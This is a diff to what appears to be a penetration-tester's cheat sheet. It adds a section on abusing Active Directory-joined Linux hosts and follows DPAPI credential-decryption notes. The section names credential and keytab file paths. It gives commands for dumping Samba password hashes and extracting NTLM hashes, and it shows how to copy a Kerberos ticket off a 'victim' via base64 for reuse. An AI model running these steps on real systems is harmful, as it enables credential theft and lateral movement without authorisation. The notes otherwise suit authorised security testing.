@@ -201,3 +201,33 @@ Enter-PSSession {PSSession_ID_returned}
 - We can then use the masterkey to decrypt credentials, which are commonly found in `~\Appdata\(Roaming/Local)\Microsoft\Credentials\` again using impacket:
   - `dpapi.py credential -file {credential_file} -key '0x{master_key}'`
 - NetExec can also perform this process automated with `nxc smb --dpapi cookies`
+
+## Abusing AD-joined Linux
+
+- Automated enumeration: [linikatz](https://github.com/CiscoCXSecurity/linikatz.git)
+  - Will check for common avenues, like saved kerberos tickets
+
+**Common sources of credentials**
+- Winbind config in Samba configuration: `/etc/samba/smb.conf`
+- Kerberos authentication config file: `/etc/krb5.conf`
+- Private key in `/var/lib/sss/secrets/.secrets.mkey`
+- Kerberos keys in
+  - `/tmp/krb5_[uid]`
+  - `/etc/krb5.keytab`
+- If we have root, can go into the `/var/lib/samba/secrets` folder and look for these files:
+  - `secrets.tdb` - Contains domain secrets, machine account passwords
+  - `passdb.tdb` or `smbpasswd` - User password hashes
+  - `krb5.keytab` - Kerberos keytab if domain-joined
+  	- Then run `pdbedit -L -w` to output in smbpasswd format (LM:NT hashes)
+
+**Keytabs**
+- Sometimes used to authenticate Linux boxes to Kerberos
+- Get current users tokens with `klist`
+- List keytab contents with `klist -k /etc/kr5.keytab`
+- [KeyTabExtract](https://github.com/sosdave/KeyTabExtract) can extract NTLM hashes from these
+
+**Kerberos TGTs**
+- If a new kerberos TGT was added, we can use `kvno` (from `krb5-user`)
+- On victim: `kvno krbtgt/example.com --out-cache /tmp/kvno_tgt; cat /tmp/kvno_tgt | base64`
+- On kali: Paste b64 into a file and then `cat /tmp/kvno_tgt.b64 | base64 -d > /tmp/kvno_tgt`
+- Should be able to then export with `KRB5CCNAME=/tmp/kvno_tgt`
